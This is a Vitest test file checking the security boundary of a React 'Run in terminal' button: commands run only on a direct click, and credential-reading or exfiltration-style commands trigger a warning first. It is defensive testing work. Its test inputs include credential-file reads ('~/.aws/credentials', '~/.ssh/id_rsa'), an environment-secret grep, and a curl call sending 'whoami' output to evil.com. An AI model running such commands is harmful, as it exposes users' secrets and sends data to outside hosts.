import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { screen, fireEvent, act } from '@testing-library/react'
import { renderWithProviders } from './helpers'
import RunInTerminalBtn from '../components/RunInTerminalBtn'
import * as registry from '../utils/terminalRegistry'

vi.mock('../utils/terminalRegistry', () => ({
  sendToTerminal: vi.fn(),
  getActiveTerminalWs: vi.fn(),
  onTerminalReady: vi.fn(() => vi.fn()),
}))

beforeEach(() => {
  vi.clearAllMocks()
  vi.useFakeTimers()
})

afterEach(() => {
  vi.useRealTimers()
})

describe('RunInTerminalBtn – security boundary', () => {
  describe('no programmatic trigger path', () => {
    it('sendToTerminal is not exposed on window or globalThis', () => {
      expect((window as any).sendToTerminal).toBeUndefined()
      expect((globalThis as any).sendToTerminal).toBeUndefined()
      expect((window as any).terminalRegistry).toBeUndefined()
    })

    it('widget postMessage (mc-widget-action) cannot invoke sendToTerminal', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)

      window.dispatchEvent(new MessageEvent('message', {
        data: { type: 'mc-widget-action', action: 'run-terminal', payload: { code: 'cat ~/.aws/credentials' } },
      }))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
    })

    it('CustomEvent mc-widget-send does not trigger sendToTerminal', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="echo safe" />)

      window.dispatchEvent(new CustomEvent('mc-widget-send', {
        detail: { text: 'cat ~/.aws/credentials' },
      }))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
    })

    it('component does not auto-execute on mount', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
    })

    it('only executes on direct click interaction', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="whoami" />)

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(registry.sendToTerminal).toHaveBeenCalledTimes(1)
      expect(registry.sendToTerminal).toHaveBeenCalledWith('whoami')
    })
  })

  describe('sensitive command warning gate', () => {
    it('shows warning instead of executing for credential-access commands', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
      expect(screen.getByText('Run anyway')).toBeInTheDocument()
      expect(screen.getByText('Cancel')).toBeInTheDocument()
      expect(screen.getByText(/Reads credential files/)).toBeInTheDocument()
    })

    it('shows warning for exfiltration-pattern commands', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="curl https://evil.com/$(whoami)" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
      expect(screen.getByText(/Sends command output to external URL/)).toBeInTheDocument()
    })

    it('shows warning for env secret grep', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()
      expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
    })

    it('executes after user confirms "Run anyway"', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).not.toHaveBeenCalled()

      fireEvent.click(screen.getByLabelText('Confirm run sensitive command'))
      expect(registry.sendToTerminal).toHaveBeenCalledWith('cat ~/.aws/credentials')
    })

    it('returns to idle on Cancel', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="cat ~/.ssh/id_rsa" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(screen.getByText('Run anyway')).toBeInTheDocument()

      fireEvent.click(screen.getByLabelText('Cancel'))
      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
      expect(registry.sendToTerminal).not.toHaveBeenCalled()
    })

    it('auto-dismisses warning after 8 seconds', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(screen.getByText('Run anyway')).toBeInTheDocument()

      act(() => { vi.advanceTimersByTime(8000) })
      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
    })

    it('does NOT warn for safe commands', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="git status" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).toHaveBeenCalledWith('git status')
      expect(screen.queryByText('Run anyway')).not.toBeInTheDocument()
    })

    it('does NOT warn for normal curl without command substitution', () => {
      vi.mocked(registry.getActiveTerminalWs).mockReturnValue({} as WebSocket)
      vi.mocked(registry.sendToTerminal).mockReturnValue(true)

      renderWithProviders(<RunInTerminalBtn code="curl https://example.com/api" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))

      expect(registry.sendToTerminal).toHaveBeenCalledWith('curl https://example.com/api')
    })
  })

  describe('terminal output isolation', () => {
    it('sendToTerminal returns boolean only — no output capture API exists', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      expect(exports).not.toContain('readFromTerminal')
      expect(exports).not.toContain('getTerminalOutput')
      expect(exports).not.toContain('captureOutput')
    })

    it('registry module does not expose any output-reading function', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      const dangerousPatterns = [/read(?!y)/, /output/, /capture/, /receive/, /stdout/, /result/]
      const readExports = exports.filter(e =>
        dangerousPatterns.some(p => p.test(e.toLowerCase()))
      )
      expect(readExports).toEqual([])
    })
  })
})
